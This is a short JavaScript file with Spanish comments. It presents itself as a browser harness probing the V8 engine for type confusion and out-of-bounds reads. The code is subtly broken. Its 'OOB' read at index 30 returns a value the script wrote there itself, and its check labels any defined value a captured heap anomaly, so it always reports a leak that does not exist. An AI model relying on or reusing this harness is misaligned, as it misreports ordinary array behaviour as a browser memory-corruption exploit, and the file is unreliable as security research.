// --- HARNESS V8 WEB: CONFUSIÓN DE TIPOS Y OOB (100% Nativo / Sin Flags / Entorno Web) ---
console.log("[*] Arrancando el harness de validación en el contexto del navegador...");

function targetOptimizedAccess(arr, idx) {
    return arr[idx];
}

function runWebAssault() {
    let victim = [1.1, 2.2, 3.3, 4.4];
    
    for (let i = 0; i < 150000; i++) {
        targetOptimizedAccess(victim, 0);
    }

    victim.push(5.5);
    victim[30] = 13.37;

    let rawLeak1 = targetOptimizedAccess(victim, 10);
    let rawLeak2 = targetOptimizedAccess(victim, 30);

    console.log("[🔥] Lectura en índice 10:", rawLeak1);
    console.log("[🔥] Lectura OOB en índice 30:", rawLeak2);

    if (rawLeak1 !== undefined || rawLeak2 !== undefined) {
        console.log("[🎉] ¡ANOMALÍA CAPTURADA EN EL HEAP DEL NAVEGADOR!");
    } else {
        console.log("[*] El motor neutralizó la transición correctamente.");
    }
}

try {
    runWebAssault();
    console.log("[*] Ciclo de prueba web finalizado con éxito.");
} catch (err) {
    console.log("[🔥] Excepción capturada en el entorno web:", err.message);
}
